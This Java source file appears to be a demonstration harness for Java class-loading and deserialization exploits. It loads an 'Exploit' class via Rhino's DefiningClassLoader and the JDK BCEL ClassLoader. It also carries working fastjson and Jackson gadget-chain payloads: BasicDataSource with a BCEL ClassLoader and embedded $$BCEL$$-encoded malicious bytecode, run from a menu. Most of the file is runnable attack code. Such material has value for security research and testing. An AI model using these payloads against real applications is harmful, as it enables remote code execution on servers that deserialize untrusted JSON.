package classloader.proj;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Scanner;

import com.alibaba.fastjson.JSON;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.mozilla.javascript.DefiningClassLoader;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

public class MainTest {

	private static String readClass(String cls) {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		try {
			IOUtils.copy(new FileInputStream(new File(cls)), bos);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return Base64.encodeBase64String(bos.toByteArray());
	}

	private static String getEvilClassPath() {
		return System.getProperty("user.dir") + "/target/classes/classloader/proj/Exploit.class";
	}

	// use mozilla (js-1.7R2.jar) DefiningClassLoader to load byte string of class,
	// which encoded by base64
	private static void mozilla_definingClassLoader() throws Exception {
		String evilCode = readClass(getEvilClassPath());

		// rhino js : org.mozilla.javascript.DefiningClassLoader
		DefiningClassLoader dcl = new DefiningClassLoader();
		Class<?> c = dcl.defineClass("classloader.proj.Exploit", Base64.decodeBase64(evilCode));
		c.newInstance();
	}

	// use jdk bcel ClassLoader to load soecial encoded class name of byte string of
	// class
	private static void bcel_definingClassLoader() throws Exception {
		// jdk rt.jar: com.sun.org.apache.bcel.internal.util.ClassLoader
		String encodedClassName = "$$BCEL$$" + BcelEncode.encode(getEvilClassPath());
		System.out.println(encodedClassName);
		Class.forName(encodedClassName, true, new ClassLoader());
	}

	private static void fastjson_deserialize() throws Exception {
		String poc = "{\n" 
				+ "    {\n" 
				+ "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" 
				+ "        \"d\":\n"
				+ "        {\n" 
				+ "            \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"
				+ "            \"driverClassLoader\":\n" 
				+ "            {\n"
				+ "                \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\",\n"
				+ "            },\n" 
				+ "            \"driverClassName\":\n"
				+ "                \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuSmO$d3P$U$7e$ee$d6$d1$aet$M$86$9b$M$f1$F_$b7$a1$d4$f77$Y$c4$QL$8cS$88$p$u$f1$d3$5dw3$ef$ec$da$a6$bd3$f8$8b$fc$8c$l$d0$98$e8$P$f0G$ZO$cb$80$n$b3$c9$ed$cdyz$ce$f3$3c$e7$dc$db$df$7f$7e$fc$Cp$l$ab$sr$b8$9c$c5$V$5c5p$cd$c4u$dc0QAUG$cd$c0$82$81$9bqtK$c7$a2$J$T$b6$8e$db$3a$ee0$8c$zKO$aa$V$86t$a5$ba$cd$a0$ad$f9m$c1$90oHO$bc$ee$f7Z$o$dc$e2$z$97$90B$c3w$b8$bb$cdC$Z$c7$DPS$ld$c40$dbp$5c$kE$ae$cf$db$o$b4$83$d0$ef$da$eb$bb$81$ebK$b5$c4$60$ae$ef$3a$oP$d2$f7$o$jw$a9$a6$c7$a5$c7P$aa$bcot$f9$tn$bb$dc$eb$d8M$VJ$af$b3$948$e0a$878$a7G$7cf0$96$jw$e0$97$91$7e$f1$mG$fa$f6$8b$8d$p$ZJ$cb5$Vw$3e$be$e2A$e2$93Z$s$hM$bf$l$3a$e2$b9$8c$7d$5b$D$7b$8bq$b9$85$J$e4u$dc$b3h$86$P$a8$f5z$bd$3e$f8$y$da$f3$f5$ba$8e$87$W$k$e1$b1$8e$t$W$9e$82$d8$t$ff5F$a6$fd$40PSs$f6$b3$mp$a5$c3$93v$ed5$ee$3a$7d$97$x$3f$5c$e4A$60a$Zujl$84e$L$x$c83$cc$fco$8c$t47Z$5d$e1$a8C$a2$E$3a$o$3ai$ees$a4D$8fN$d6$ef$ab$e1Ym$92gE$ce$F$ef$z$N$f9$Z$82$Z$f4$m$8e$5c$o$yVF$9f$d3$d41$fa$a6$ef$v$d9$a3$b9$9a$j$a1$8e$82b$a5$da8$95C$82$9a$d8$V$OCe$e4$F$Y$826C$df$RQD$V$f9$e0$c0$g$9d$e9V$c8$j$81yXt$d7$e3$t$N$W$l$lR$98$a4h$95vF$7b$ae$f6$N$ec$xR$85$f4$3e$b4$3d$CR$98$a2$f7$E$a5$83$925J$b6$I$vPd$j$U$60$ggh$_$d2$d2$I$v$n$8b$b3$98$Z$d0$$$d0$8a$b3$d81$d5X$C$U$87$u$Y$ca$98$3dAa$e0$i$89$b1$84$a2$87L$92u$e1$3b2$99$9f$Y$dbI$X$f4$e6$8eV0$9a$fb$c8$be$fd$C$e3em$l$e3$7b$D$d6$Z$faC$d3$89N$89$ea$40f$8a$a4$S$a3e$8c$e3$3c$d9$3d$d4$z$93$d6$i$n$c4LKG$ea$9d$8e$8b$b1$fc$a5$c4$ea$fc_$807$fc$bd$k$E$A$A\"\n"
				+ "        }\n" 
				+ "    }:\"ddd\"\n" 
				+ "}";
		System.out.println(poc);
		Object json = JSON.parse(poc);
		System.out.println(json.toString());
	}

	private static void jackson_deserialize() throws Exception {
//		String poc = "\n{\n" 
//	            + "    \"@class\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" 
//				+ "    \"driverClassName\" : \n"
//				+ "        \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuSmO$d3P$U$7e$ee$d6$d1$aet$M$86$9b$M$f1$F_$b7$a1$d4$f77$Y$c4$QL$8cS$88$p$u$f1$d3$5dw3$ef$ec$da$a6$bd3$f8$8b$fc$8c$l$d0$98$e8$P$f0G$ZO$cb$80$n$b3$c9$ed$cdyz$ce$f3$3c$e7$dc$db$df$7f$7e$fc$Cp$l$ab$sr$b8$9c$c5$V$5c5p$cd$c4u$dc0QAUG$cd$c0$82$81$9bqtK$c7$a2$J$T$b6$8e$db$3a$ee0$8c$zKO$aa$V$86t$a5$ba$cd$a0$ad$f9m$c1$90oHO$bc$ee$f7Z$o$dc$e2$z$97$90B$c3w$b8$bb$cdC$Z$c7$DPS$ld$c40$dbp$5c$kE$ae$cf$db$o$b4$83$d0$ef$da$eb$bb$81$ebK$b5$c4$60$ae$ef$3a$oP$d2$f7$o$jw$a9$a6$c7$a5$c7P$aa$bcot$f9$tn$bb$dc$eb$d8M$VJ$af$b3$948$e0a$878$a7G$7cf0$96$jw$e0$97$91$7e$f1$mG$fa$f6$8b$8d$p$ZJ$cb5$Vw$3e$be$e2A$e2$93Z$s$hM$bf$l$3a$e2$b9$8c$7d$5b$D$7b$8bq$b9$85$J$e4u$dc$b3h$86$P$a8$f5z$bd$3e$f8$y$da$f3$f5$ba$8e$87$W$k$e1$b1$8e$t$W$9e$82$d8$t$ff5F$a6$fd$40PSs$f6$b3$mp$a5$c3$93v$ed5$ee$3a$7d$97$x$3f$5c$e4A$60a$Zujl$84e$L$x$c83$cc$fco$8c$t47Z$5d$e1$a8C$a2$E$3a$o$3ai$ees$a4D$8fN$d6$ef$ab$e1Ym$92gE$ce$F$ef$z$N$f9$Z$82$Z$f4$m$8e$5c$o$yVF$9f$d3$d41$fa$a6$ef$v$d9$a3$b9$9a$j$a1$8e$82b$a5$da8$95C$82$9a$d8$V$OCe$e4$F$Y$826C$df$RQD$V$f9$e0$c0$g$9d$e9V$c8$j$81yXt$d7$e3$t$N$W$l$lR$98$a4h$95vF$7b$ae$f6$N$ec$xR$85$f4$3e$b4$3d$CR$98$a2$f7$E$a5$83$925J$b6$I$vPd$j$U$60$ggh$_$d2$d2$I$v$n$8b$b3$98$Z$d0$$$d0$8a$b3$d81$d5X$C$U$87$u$Y$ca$98$3dAa$e0$i$89$b1$84$a2$87L$92u$e1$3b2$99$9f$Y$dbI$X$f4$e6$8eV0$9a$fb$c8$be$fd$C$e3em$l$e3$7b$D$d6$Z$faC$d3$89N$89$ea$40f$8a$a4$S$a3e$8c$e3$3c$d9$3d$d4$z$93$d6$i$n$c4LKG$ea$9d$8e$8b$b1$fc$a5$c4$ea$fc_$807$fc$bd$k$E$A$A\",\n"
//				+ "    \"driverClassLoader\" :\n" 
//				+ "    {,\n"
//				+ "      \"@class\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" 
//				+ "    },\n"
//				+ "    \"logWriter\":\n" 
//				+ "      {\n" 
//				+ "        \"@class\":\"java.io.PrintWriter\",\"/tmp/123\"\n" 
//				+ "      }\n" 
//				+ "}";
		String poc = "{\n" 
				+ "    \"@class\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" 
				+ "    \"driverClassName\":\n"
				+ "       \"org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5UmS$TW$U$7e$ae$J$ec$b2n$V$a3$88$bc$94Bk5$60$60$Jo$K$BDR$a1$d8$E$u$d8$b4$a9$b5$edes$83$8b$9b$dd$ccfW$d3_$e4W$fd$920e$a6$fd$d8$99$fe$Kg$fa$3f$da$9e$bbYD$qc$9d$v3$dc$bb$f7$dcs$9f$fb$9cs$9es$f3$e7$df$bf$fe$G$m$NW$c1w$MK$fc$X7pJ$c6$B7$9f$d6$5c$c7$Q$f5$aa$edZ$bea$ba$95$K$t$bb$_$wU$9b$fb$c2$c8$92$c1u$b2$z$f3$D$fe$8c$af$K$ee$u$883t$l$d0$ca$b0$b9$b3ol$ed$j$I$d3g$e8$5c$b4$i$cb_f$88$rG$L$M$f1$ac$5b$S$gb$e8$d2$d1$81N$86$8b9$cb$R$9bAeOx$P$f9$9e$z$Y$S9$d7$e4v$81$7b$96$5cG$c6$b8$ff$c4$aa1$dc$cd$fd$_$92$Z$GM$d4$85$Z$f8$o$5b$v1$dcH$e6N$Y$ef$fa$9e$e5$ecgF$cf$9a4$5c$c2e$F$J$86K$t$7b$3b$81$e3$5b$V$a1$e3$Kz$Iv_$f8$91$85$a1$t$f96Hd$OQzu$5cC$l$85$pY0$dc$fc$8f$fb$b7$3d$d7$U$b5ZF$c1$A$c3$d5$d0n$b9$c6jP$$$LO$94v$E$_$JO$c1$c7$M$7d$c7$7b$hN5$f0$JI$f0Jk$5b$c3$t$YQ0$7c$8a$7b$84$ab$e3S$7c$c6p$81$b8$bfu$8e$a1$f7$98$ffi$40$8a$60$Q$9f$cb$ba$dd$60$b8$96l$eb2Z$d0$d0$8f$a4t$ge$b8$7c$e2$d4bC$fb$wn1$40$c18$dd$f3n$f0$ab$81e$87$9c$N$a4$VL$9e$ST$cbC$c7$U$a6$Z$94g$dc$O$c4V$f9$9d$S$b6D$d7$be$84$v$ccJVs$b2$3cm$b2$5e$90$kwt$ccc$81D$cb$abU$e1$90$40$c6$3fH$m$R$ed$8c$8aE$G$a6I$a4e$jw$b1$c2$a0$fan$cb$87$e1J$b2$z$af$7e$ac$ea$c8$86$be$94$c1$92l$HY$b3$fb$3a$d6$b0N$91$3e$e7$96$bf$e6za$Dm$a8$d8$m$nDb$l$8e$a4$3c$5c$e6$96$zJ$K$be$a2$8c$9f$dcp$bfn$8a$aao$b9$O$j5$a5$da$Tg$af$t$fcjK$Lt$b4$8d$f0$u$V$5eX8$wx$ae$bd$fe2$b29E$9dZ$3dn$Tw$86$$Q$b7$fc$82$ac$P$r$83$e8j$bbn$e0$99b$cd$92$7d$dc$df$b6$_$t$q4$c3$60$d9u$8d$ed$e7$8e$f0$d23$f3$e9$f9$f4$f4$f4$ec$ectzjn$e6$f6$e4$q$89a$u$f7$be$7d$e2$a1$$$9av$f4$da$a8$f4$84$98$T$94$m$V$8f$e8u$d3q$B$X5$3c$c6$8fD$e1Lk$be$c9$94$82$9f$8f$fb$ecTye$bc$K$f64$98$e8b8$bf$pj$81$ed$_$3cZYYQAA$a5$3eP$r$S$s$p$r$b6$_$91$9e0$M$q$b3$ef$f5$3b$90$7eO$e5$b0$ac$81c$W$p$a0bB$fe$c5$e8$8b$kP$g$VZ$Z4SW$a1c$ac$J$f5$V$7d$9c$83Fcgh$8c$e1$3c$8dz$cb$81$e6$o$cd$5d2$n$d1$e1$bfB$m$60$f7$Q$ddc$N$5c$cd$j$a1$bfx$84$c1$e2$ad$G$86$9a$b8$de$c4$cd$7cbl$93$z$c4_$60$f0$I$a9$e2$f8$n$s$9a$98$e9$8b7p$3b$91$a1$a1$81$a5$cdT$D$f7$8a$L$f1$3f$feyM$c7$be$98$eb$Y$7f$99O$7c$f92$bct$T$5bx$QQ$9a$o$C$f2z$95V$3a$R$eb$a5y$80$beF$f0$R$ae$T$a9$r$9a$d7$d1$8d$3c$bd$96$5bH$60$h$3d$n$fd$e5$WE$e4h$Htz$3dD$a5$Ub$86$7c$be$s$f4$n$fa$r$db$a1$dd$YaM$90g$kq$fa$3f$87$87$f8$86$CT$f1$fd$9bl$dd$a1$b5$ccb$ea$Fb$y$97$f8$e1$Q$3f$e5$8f$c0$vf$b3$d8D$vQn$c0$a2p$ac$ee$c7$N$d8$NT$9ap$7e$7f$Vf$9d$a1$Q$s$f7$db$7f$B$97bQ$5d$3c$H$A$A\",\n" 
				+ "    \"driverClassLoader\":\n" 
				+ "     {\n" 
				+ "          \"@class\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" 
				+ "     },\n"
				+ "     \"logWriter\":null\n" 
				+ "}";
		System.out.println(poc);
		ObjectMapper om = new ObjectMapper();
		om.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT, JsonTypeInfo.As.PROPERTY);
		om.readValue(poc.getBytes(), Object.class);

	}

	public static void main(String[] args) throws Exception {
		Scanner sc = new Scanner(System.in);

		while (true) {
			System.out.println("" + "[1]: mozilla\n" + "[2]: bcel\n" + "[3]: fastjson\n" + "[4]: jackson\n"
					+ "Your Choice is [0-4]: \n");
			String choice = sc.nextLine();
			//try {
				switch (choice) {
				case "1":
					mozilla_definingClassLoader();
					break;
				case "2":
					bcel_definingClassLoader();
					break;
				case "3":
					fastjson_deserialize();
					break;
				case "4":
					jackson_deserialize();
					break;
				case "0":
				case "q":
				default:
					System.out.println("FInished.");
					sc.close();
					return;
				}
			//} catch (Exception e) {
			//	System.out.println(e);
			//}
		}

	}

}
